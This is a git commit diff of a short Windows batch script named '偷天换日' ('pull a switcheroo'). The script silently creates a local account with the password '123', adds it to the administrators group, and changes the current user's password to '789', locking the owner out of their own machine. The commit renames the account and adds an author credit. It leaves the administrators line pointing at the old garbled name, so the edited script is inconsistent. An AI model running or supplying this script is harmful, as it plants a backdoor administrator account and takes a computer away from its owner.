c946fbad8d77c5563b3d765c657a26a98f1ac5b8
zhoushoujian <qianchengyimeng@qq.com>
2018-03-25 21:00:26 +0800

    偷天换日

--- 偷天换日.bat
+++ 偷天换日.bat
@@ -1,6 +1,7 @@
 @echo off
-@net user ¼Óqq123456 123 /add
+@echo made by zsj 2017/12/17
+@net user jiaqq123456 123 /add
 @net localgroup administrators ¼Óqq123456 /add
 @net user %username% 789
-rem net user ¼Óqq123456789 /delete
+rem net user jiaqq123456789 /delete
 exit>nul
